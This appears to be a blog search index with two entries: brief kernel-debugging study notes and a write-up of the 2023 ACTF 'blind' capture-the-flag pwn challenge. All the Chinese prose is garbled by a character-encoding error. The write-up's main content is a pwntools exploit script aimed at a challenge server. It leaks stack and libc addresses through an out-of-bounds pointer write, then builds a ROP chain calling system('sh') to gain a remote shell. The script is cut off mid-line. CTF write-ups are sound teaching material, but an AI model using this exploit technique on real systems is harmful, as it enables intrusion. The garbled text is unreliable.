<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å†…æ ¸è°ƒè¯•</title>
      <link href="/2023/10/31/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/"/>
      <url>/2023/10/31/%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h1><h2 id="å‡†å¤‡å¼€å§‹"><a href="#å‡†å¤‡å¼€å§‹" class="headerlink" title="å‡†å¤‡å¼€å§‹"></a>å‡†å¤‡å¼€å§‹</h2><p>ç”¨æˆ·çº§çš„ç¨‹åºbugå¸¸å¸¸ç›´æˆªäº†å½“</p><p>å†…æ ¸ä¸­çš„bugä¸æ¸…æ™°</p><p>é‡ç°bugæ—¶ï¼ŒæˆåŠŸä¸€å¤§åŠ</p><h2 id="å†…æ ¸ä¸­çš„bug"><a href="#å†…æ ¸ä¸­çš„bug" class="headerlink" title="å†…æ ¸ä¸­çš„bug"></a>å†…æ ¸ä¸­çš„bug</h2><p>ç‹¬ç‰¹çš„é—®é¢˜ï¼šå®šæ—¶é™åˆ¶ï¼Œæ¡ä»¶ç«äº‰</p><h2 id="é€šè¿‡æ‰“å°æ¥è°ƒè¯•"><a href="#é€šè¿‡æ‰“å°æ¥è°ƒè¯•" class="headerlink" title="é€šè¿‡æ‰“å°æ¥è°ƒè¯•"></a>é€šè¿‡æ‰“å°æ¥è°ƒè¯•</h2><p>printk()å‡½æ•°</p><h3 id="å¥å£®æ€§"><a href="#å¥å£®æ€§" class="headerlink" title="å¥å£®æ€§"></a>å¥å£®æ€§</h3><p>éšæ—¶å¯è°ƒç”¨</p><p>åœ¨ä¸­æ–­åˆå§‹åŒ–åï¼Œéƒ½å¯ä»¥ä½¿ç”¨</p><h3 id="æ—¥å¿—ç­‰çº§"><a href="#æ—¥å¿—ç­‰çº§" class="headerlink" title="æ—¥å¿—ç­‰çº§"></a>æ—¥å¿—ç­‰çº§</h3><p>æœ€é‡è¦çš„KERN_EMERGå®šä¸º0ï¼Œæ— å…³ç´§è¦çš„KERN_DEBUGå®šä¸º7</p><h3 id="è®°å½•ç¼“å†²åŒº"><a href="#è®°å½•ç¼“å†²åŒº" class="headerlink" title="è®°å½•ç¼“å†²åŒº"></a>è®°å½•ç¼“å†²åŒº</h3><p>å†…æ ¸æ¶ˆæ¯ä¿å­˜åœ¨ä¸€ä¸ªLOG_BUF_LENçš„ç¯å½¢é˜Ÿåˆ—</p><p>è¶…è¿‡å¤§å°ï¼Œæ–°æ¶ˆæ¯è¦†ç›–è€æ¶ˆæ¯</p><h3 id="syslogdå’Œklogd"><a href="#syslogdå’Œklogd" class="headerlink" title="syslogdå’Œklogd"></a>syslogdå’Œklogd</h3><p>ç”¨æˆ·ç©ºé—´çš„å®ˆæŠ¤è¿›ç¨‹klogdä»è®°å½•ç¼“å†²åŒºè·å–å†…æ ¸æ¶ˆæ¯</p><p>é€šè¿‡syslogdå®ˆæŠ¤è¿›ç¨‹ä¿å­˜åœ¨ç³»ç»Ÿæ—¥å¿—è®°å½•ä¸­</p><h2 id="18-4-oops"><a href="#18-4-oops" class="headerlink" title="18.4 oops"></a>18.4 oops</h2><p>å‘ä¸­æ–­è¾“å‡ºé”™è¯¯æ¶ˆæ¯ï¼Œå¯„å­˜å™¨ä¿¡æ¯ï¼Œå¯ä¾›è·Ÿè¸ªçš„å›æº¯çº¿ç´¢</p><h3 id="ksymoops"><a href="#ksymoops" class="headerlink" title="ksymoops"></a>ksymoops</h3><p>æœªè§£ç çš„oopsé€šè¿‡ksymoopsæŒ‡ä»¤ï¼Œè½¬åŒ–ä¸ºæœ‰æ„ä¹‰çš„ç¬¦å·</p><h3 id="kallsyms"><a href="#kallsyms" class="headerlink" title="kallsyms"></a>kallsyms</h3><p>å®šä¹‰CONFIG_KALLSYMSé€‰é¡¹ï¼Œåœ¨å†…æ ¸å¯åŠ¨æ—¶åˆ›å»ºåœ°å€åˆ°ç¬¦å·åç§°çš„æ˜ å°„</p><p>è¿™ä¼šä½¿å¾—å†…æ ¸å˜å¤§</p><p>CONFIG_KALLSYMS_ALLï¼šè¿˜å­˜æ”¾æ‰€æœ‰çš„ç¬¦å·åç§°</p><h2 id="18-5-å†…æ ¸è°ƒè¯•é…ç½®é€‰é¡¹"><a href="#18-5-å†…æ ¸è°ƒè¯•é…ç½®é€‰é¡¹" class="headerlink" title="18.5 å†…æ ¸è°ƒè¯•é…ç½®é€‰é¡¹"></a>18.5 å†…æ ¸è°ƒè¯•é…ç½®é€‰é¡¹</h2><p>ä¸ºäº†æ–¹ä¾¿è°ƒè¯•æµ‹è¯•å†…æ ¸ä»£ç ï¼Œæä¾›äº†è®¸å¤šé…ç½®é€‰é¡¹</p><p>åœ¨å†…æ ¸é…ç½®ç¼–è¾‘å™¨çš„å†…æ ¸å¼€å‘èœå•é¡¹</p><pre><code>CONFIG_PREEMPT=yCONFIG_DEBUG_KERNEL=y CONFIG_KALLSYMS=y CONFIG_DEBUG_SPINLOCK_SLEEP=y</code></pre><h2 id="18-6-å¼•å‘bugå¹¶æ‰“å°ä¿¡æ¯"><a href="#18-6-å¼•å‘bugå¹¶æ‰“å°ä¿¡æ¯" class="headerlink" title="18.6 å¼•å‘bugå¹¶æ‰“å°ä¿¡æ¯"></a>18.6 å¼•å‘bugå¹¶æ‰“å°ä¿¡æ¯</h2><h2 id="ç¥å¥‡çš„ç³»ç»Ÿè¯·æ±‚é”®"><a href="#ç¥å¥‡çš„ç³»ç»Ÿè¯·æ±‚é”®" class="headerlink" title="ç¥å¥‡çš„ç³»ç»Ÿè¯·æ±‚é”®"></a>ç¥å¥‡çš„ç³»ç»Ÿè¯·æ±‚é”®</h2><p>magic sysrq key</p><p>sysrqé”®ï¼šalt-PrintScreen</p><p>æ— è®ºå†…æ ¸ä»€ä¹ˆçŠ¶æ€ï¼Œéƒ½å¯ä»¥å’Œå†…æ ¸é€šä¿¡</p><h2 id="å†…æ ¸è°ƒè¯•å™¨"><a href="#å†…æ ¸è°ƒè¯•å™¨" class="headerlink" title="å†…æ ¸è°ƒè¯•å™¨"></a>å†…æ ¸è°ƒè¯•å™¨</h2><h2 id="æ¢æµ‹ç³»ç»Ÿ"><a href="#æ¢æµ‹ç³»ç»Ÿ" class="headerlink" title="æ¢æµ‹ç³»ç»Ÿ"></a>æ¢æµ‹ç³»ç»Ÿ</h2><h3 id="ç”¨UIDåšé€‰æ‹©æ¡ä»¶"><a href="#ç”¨UIDåšé€‰æ‹©æ¡ä»¶" class="headerlink" title="ç”¨UIDåšé€‰æ‹©æ¡ä»¶"></a>ç”¨UIDåšé€‰æ‹©æ¡ä»¶</h3><p>ä¸“é—¨æµ‹è¯•æ–°ç®—æ³•</p><h3 id="ä½¿ç”¨æ¡ä»¶å˜é‡"><a href="#ä½¿ç”¨æ¡ä»¶å˜é‡" class="headerlink" title="ä½¿ç”¨æ¡ä»¶å˜é‡"></a>ä½¿ç”¨æ¡ä»¶å˜é‡</h3><h3 id="ä½¿ç”¨ç»Ÿè®¡é‡"><a href="#ä½¿ç”¨ç»Ÿè®¡é‡" class="headerlink" title="ä½¿ç”¨ç»Ÿè®¡é‡"></a>ä½¿ç”¨ç»Ÿè®¡é‡</h3><h3 id="é™åˆ¶é‡å¤é™åˆ¶"><a href="#é™åˆ¶é‡å¤é™åˆ¶" class="headerlink" title="é™åˆ¶é‡å¤é™åˆ¶"></a>é™åˆ¶é‡å¤é™åˆ¶</h3><h2 id="ç”¨äºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾å†…æ ¸ç‰ˆæœ¬"><a href="#ç”¨äºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾å†…æ ¸ç‰ˆæœ¬" class="headerlink" title="ç”¨äºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾å†…æ ¸ç‰ˆæœ¬"></a>ç”¨äºŒåˆ†æŸ¥æ‰¾æ³•æŸ¥æ‰¾å†…æ ¸ç‰ˆæœ¬</h2><h2 id="ç”¨gitäºŒåˆ†æœç´¢"><a href="#ç”¨gitäºŒåˆ†æœç´¢" class="headerlink" title="ç”¨gitäºŒåˆ†æœç´¢"></a>ç”¨gitäºŒåˆ†æœç´¢</h2><h2 id="ç¤¾åŒº"><a href="#ç¤¾åŒº" class="headerlink" title="ç¤¾åŒº"></a>ç¤¾åŒº</h2>]]></content>
      
      
      
        <tags>
            
            <tag> study notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023ACTF_blind</title>
      <link href="/2023/10/31/2023ACTF-blind/"/>
      <url>/2023/10/31/2023ACTF-blind/</url>
      
        <content type="html"><![CDATA[<p>è¿™æ¬¡ACTFæ‹¿äº†äººç”Ÿç¬¬ä¸€ä¸ªäºŒè¡€ï¼Œè™½ç„¶é¢˜ç›®ä¸éš¾ï¼Œä½†è¿˜æ˜¯å†™ä¸ªwpåº†ç¥ä¸‹äºŒè¡€</p><p><del>å†™å®Œè¿™é¢˜åå°±å»ä¼¯å¾·ä¹‹é—¨å¯åŠ¨äº†</del></p><h2 id="é¢˜ç›®å¤ç°"><a href="#é¢˜ç›®å¤ç°" class="headerlink" title="é¢˜ç›®å¤ç°"></a>é¢˜ç›®å¤ç°</h2><p>ä¸€é“bropï¼Œæ­¤å‰æˆ‘å¹¶æ²¡æœ‰å†™è¿‡bropçš„é¢˜ç›®ï¼Œå› æ­¤å¸¸è§„çš„åšæ³•å¹¶ä¸ä¼š</p><p>é¢˜ç›®å¯ä»¥ä¿®æ”¹ä¸€æ®µ8å­—èŠ‚çš„nameï¼ŒAaaaaaa\x00ï¼Œé€šè¿‡ADæŒ‡ä»¤ç§»åŠ¨å½“å‰çš„å…‰æ ‡ï¼ŒWSæŒ‡ä»¤ä¿®æ”¹å½“å­—ç¬¦çš„asciiç </p><p>æ¯è¾“å®Œä¸€è¡ŒæŒ‡ä»¤ï¼Œå°±ä¼šå›æ˜¾å½“å‰å­—ç¬¦ä¸²ï¼ˆ8å­—èŠ‚ï¼‰</p><p>ä¹Ÿå¯ä»¥ä¸€è¡Œç”¨12A20W8Dè¿™ç§æ–¹å¼ï¼Œå¿«é€Ÿæ‰§è¡ŒæŒ‡ä»¤</p><p>æœ€åè¾“å…¥ä¸€ä¸ªç©ºè¡Œï¼Œç¨‹åºå°±ä¼šç»“æŸ</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>ç»è¿‡ç®€å•æµ‹è¯•åï¼Œå‘ç°è¾“å…¥8D1Wåï¼Œå›æ˜¾ä¼šå‘ç”Ÿå˜åŒ–</p><p><img src="1.png" alt="print1"></p><p>ç„¶åæˆ‘ä»¬å°è¯•è¾“å…¥8D2Wï¼Œ8D3Wç­‰ç­‰ï¼Œä¼šå‘ç°æ¯æ¬¡å›æ˜¾çš„èµ·å§‹åç§»éƒ½ä¼šå³ç§»ä¸€æ ¼ï¼Œä½†æ€»å…±è¿˜æ˜¯8å­—èŠ‚å›æ˜¾</p><p><img src="2.png" alt="print2"></p><p><img src="3.png" alt="print3"></p><p><strong>å› æ­¤æˆ‘ä»¬å¯ä»¥çŒœæµ‹ï¼Œname_strååç§»8å­—èŠ‚ï¼Œæ˜¯ä¸€ä¸ªname_strçš„æŒ‡é’ˆname_ptrï¼Œç¨‹åºé€šè¿‡ä»–æ‰¾åˆ°name_strå¹¶å®Œæˆç›¸åº”æ“ä½œã€‚</strong></p><p>name_ptrçš„åç§»é‡idxå¯ä»¥oobï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥å®ç°ä»»æ„å†™ï¼›name_ptrå¯ä»¥ä¿®æ”¹ï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥å®ç°ä»»æ„è¯»</p><p>suçš„wpä¸­ï¼Œé€šè¿‡ä»»æ„è¯»ç¨‹åºæ®µï¼Œæ³„éœ²äº†ç¨‹åºçš„æ ·è²Œï¼›ä½†æˆ‘åšçš„æ—¶å€™å¹¶æ²¡æœ‰æŠŠname_ptræ”¹åˆ°ç¨‹åºæ®µä¸Šï¼Œè€Œæ˜¯æŠŠæ‰€æœ‰æ“ä½œéƒ½åœ¨æ ˆä¸Šå®Œæˆäº†</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>é¦–å…ˆæ³„éœ²æ ˆä¸Šåœ°å€ï¼Œå†™ä¸€ä¸ªæ³„éœ²åç§»offsetå¤„çš„read_stackå‡½æ•°ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">read_stack</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'aaa\x00\n> '</span><span class="token punctuation">,</span><span class="token string">'8D'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'W'</span><span class="token punctuation">)</span>    word <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>        word <span class="token operator">=</span> word<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> word<span class="token operator">+</span>r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>f<span class="token string">'&amp;#123;offset&amp;#125;A&amp;#123;offset&amp;#125;S'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token number">-8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># recover the name_ptr and idx</span>    <span class="token keyword">return</span> data</code></pre><p>æ³„éœ²å®Œåœ°å€åï¼Œæˆ‘è¿˜æŠŠname_ptrå’Œidxéƒ½æ¢å¤äº†ï¼Œä¾¿äºåç»­åˆ©ç”¨</p><p>è¿™æ˜¯æˆ‘æ³„éœ²åå¾—åˆ°çš„æ ˆå¸ƒå±€ï¼ˆçŒœæµ‹ï¼‰</p><pre><code># 0-7 name_buf# 8-16 name_ptr# 16-23 dirty:leak_pie# 24-31 libc_main_ret(ret)# 32-39 stack# 40-47 0x1000000# 48-55 main# 56-63# 64-71# 72-79 random</code></pre><p>ç”±äºæˆ‘å¹¶æ²¡æœ‰å®Œæˆç¨‹åºæ®µ0x555500000å¤„çš„æ³„éœ²ï¼Œå› æ­¤åªå¾—åˆ°libc_main_retä¸€ä¸ªlibcåœ°å€ï¼Œç„¶åæˆ‘å°±é™·å…¥äº†ä¸€ä¸ªä¸‹åˆçš„çŒœæµ‹libcç‰ˆæœ¬ç¯èŠ‚ğŸ˜­ï¼Œåæ­£libcç‰ˆæœ¬æ˜¯2.31ï¼Œå°ç‰ˆæœ¬æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå…¨è¯•äº†ä¸€é</p><p>æ¥ç€å†™ä¸€ä¸ªwrite_stackï¼Œ write_stackå‰è¦è¯»æ ˆä¸Šçš„æ—§åœ°å€ï¼Œç„¶åè®¡ç®—åç§»</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_shift</span><span class="token punctuation">(</span>old<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target<span class="token operator">>=</span>old<span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>target<span class="token operator">-</span>old<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'w'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>old<span class="token operator">-</span>target<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_stack</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> old<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    shift_str <span class="token operator">=</span> get_shift<span class="token punctuation">(</span>old <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'d'</span><span class="token operator">+</span>shift_str<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        shift_str <span class="token operator">=</span> get_shift<span class="token punctuation">(</span><span class="token punctuation">(</span>old<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>target<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'1d'</span><span class="token operator">+</span>shift_str<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span></code></pre><p>ç„¶ååªéœ€åœ¨æ ˆä¸Šä¾æ¬¡å†™ä¸‹pop_rdi,binsh_addr,system_addrå³å¯ã€‚è¯¡å¼‚çš„æ˜¯è¿™é‡Œçš„binsh_addræˆ‘ç”¨libcé‡Œçš„æ²¡ç”¨ï¼Œåªå¥½å†æ ˆä¸Šåˆå†™ä¸ª0x6873(â€˜shâ€™)</p><p>ps:å†™wpæ—¶ï¼Œæˆ‘getshåˆ°æœåŠ¡å™¨çœ‹äº†ä¸‹ï¼Œlibcç‰ˆæœ¬ç¡®å®è¯¡å¼‚ï¼Œéš¾æ€ªæˆ‘binsh_addræ²¡ç”¨</p><p><img src="4.png" alt="libc"></p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>ru         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>a<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>r         <span class="token operator">=</span> <span class="token keyword">lambda</span> n<span class="token punctuation">:</span>        io<span class="token punctuation">.</span>read<span class="token punctuation">(</span>n<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sa         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span>b<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>sl        <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>a<span class="token punctuation">)</span>s         <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">:</span>     io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">lg</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\033[1;31;40m%20s-->0x%x\033[0m'</span><span class="token operator">%</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = process('./')</span><span class="token comment" spellcheck="true"># blind</span><span class="token comment" spellcheck="true"># 0-7 name_buf</span><span class="token comment" spellcheck="true"># 8-16 name_ptr</span><span class="token comment" spellcheck="true"># 16-23 dirty:leak_pie</span><span class="token comment" spellcheck="true"># 24-31 libc_main(ret)</span><span class="token comment" spellcheck="true"># 32-39 stack</span><span class="token comment" spellcheck="true"># 40-47 0x1000000</span><span class="token comment" spellcheck="true"># 48-55 main</span><span class="token comment" spellcheck="true"># 56-63</span><span class="token comment" spellcheck="true"># 64-71</span><span class="token comment" spellcheck="true"># 72-79 random</span><span class="token keyword">def</span> <span class="token function">read_stack</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">'aaa\x00\n> '</span><span class="token punctuation">,</span><span class="token string">'8D'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'W'</span><span class="token punctuation">)</span>    word <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">:</span>        word <span class="token operator">=</span> word<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>    data <span class="token operator">=</span> word<span class="token operator">+</span>r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> u64<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span>f<span class="token string">'&amp;#123;offset&amp;#125;A&amp;#123;offset&amp;#125;S'</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token number">-8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'D'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># recover the name_ptr and idx</span>    <span class="token keyword">return</span> data    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.46.65.156'</span><span class="token punctuation">,</span> <span class="token number">32104</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'stack_addr'</span><span class="token punctuation">,</span> stack_addr<span class="token punctuation">)</span>main_addr <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">48</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'main_addr'</span><span class="token punctuation">,</span> main_addr<span class="token punctuation">)</span>leak_libc <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'leak_libc'</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> leak_libc <span class="token operator">-</span> <span class="token number">0x026d0a</span>lg<span class="token punctuation">(</span><span class="token string">'libc_base'</span><span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe6aee</span><span class="token punctuation">,</span><span class="token number">0xe6af1</span><span class="token punctuation">,</span><span class="token number">0xe6af4</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x048e50</span>target <span class="token operator">=</span> system_addrold <span class="token operator">=</span> leak_libclg<span class="token punctuation">(</span><span class="token string">'target'</span><span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_shift</span><span class="token punctuation">(</span>old<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> target<span class="token operator">>=</span>old<span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>target<span class="token operator">-</span>old<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'w'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>old<span class="token operator">-</span>target<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_stack</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> old<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    shift_str <span class="token operator">=</span> get_shift<span class="token punctuation">(</span>old <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> target <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'d'</span><span class="token operator">+</span>shift_str<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        shift_str <span class="token operator">=</span> get_shift<span class="token punctuation">(</span><span class="token punctuation">(</span>old<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>target<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">'1d'</span><span class="token operator">+</span>shift_str<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>offset<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span>pop_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x26796</span>ret <span class="token operator">=</span> pop_rdi<span class="token operator">+</span><span class="token number">1</span>binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x18a154</span>exit <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000003e660</span>write_stack<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">,</span> leak_libc<span class="token punctuation">,</span> pop_rdi<span class="token punctuation">)</span>new <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'pop_rdi'</span><span class="token punctuation">,</span>new<span class="token punctuation">)</span>old <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'old'</span><span class="token punctuation">,</span> old<span class="token punctuation">)</span>write_stack<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> old<span class="token punctuation">,</span> stack_addr<span class="token operator">+</span><span class="token number">40</span> <span class="token punctuation">)</span>new <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'binsh'</span><span class="token punctuation">,</span>new<span class="token punctuation">)</span>old <span class="token operator">=</span> read_stack<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'old'</span><span class="token punctuation">,</span> old<span class="token punctuation">)</span>write_stack<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> 